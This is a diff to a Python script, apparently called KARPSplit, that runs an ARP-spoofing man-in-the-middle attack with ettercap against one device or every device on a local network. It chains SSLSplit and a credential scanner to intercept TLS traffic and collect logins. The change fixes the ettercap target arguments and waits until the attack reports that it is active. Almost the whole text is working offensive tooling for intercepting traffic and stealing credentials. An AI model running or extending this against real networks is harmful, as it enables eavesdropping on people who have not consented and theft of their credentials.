@@ -11,10 +11,16 @@ def arpspoof(target = None):
     gateway = gws['default'][netifaces.AF_INET][0]
     print("Using gateway " + gateway)
     if target is None:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"])
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"], stdout=PIPE)
     else:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//" + "/"+gateway+"//"])
-    return spoofer
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"], stdout=PIPE)
+    while 1:
+        line = spoofer.stdout.readline()
+        if line:
+            if "(press 'q' to exit)" in line:
+                print("Activated mitm attack...")
+                break
+            print(line)
 
 
 def sslsplit():
@@ -58,15 +64,11 @@ print("\nKARPSplit v0.1\n")
 if len(sys.argv) > 1:
     print("Starting ARP Spoof on " + sys.argv[1] + "... ")
     arpspoof(sys.argv[1])
-    print("Done")
 else:
     print("Starting ARP Spoof on all devices... ")
     arpspoof()
-    print("Done")
-time.sleep(1)
 print("Starting SSLSplit... ", end="")
 splitter = sslsplit()
-print("Done")
 time.sleep(1)
 print("Starting credential scanner...")
 read_output()
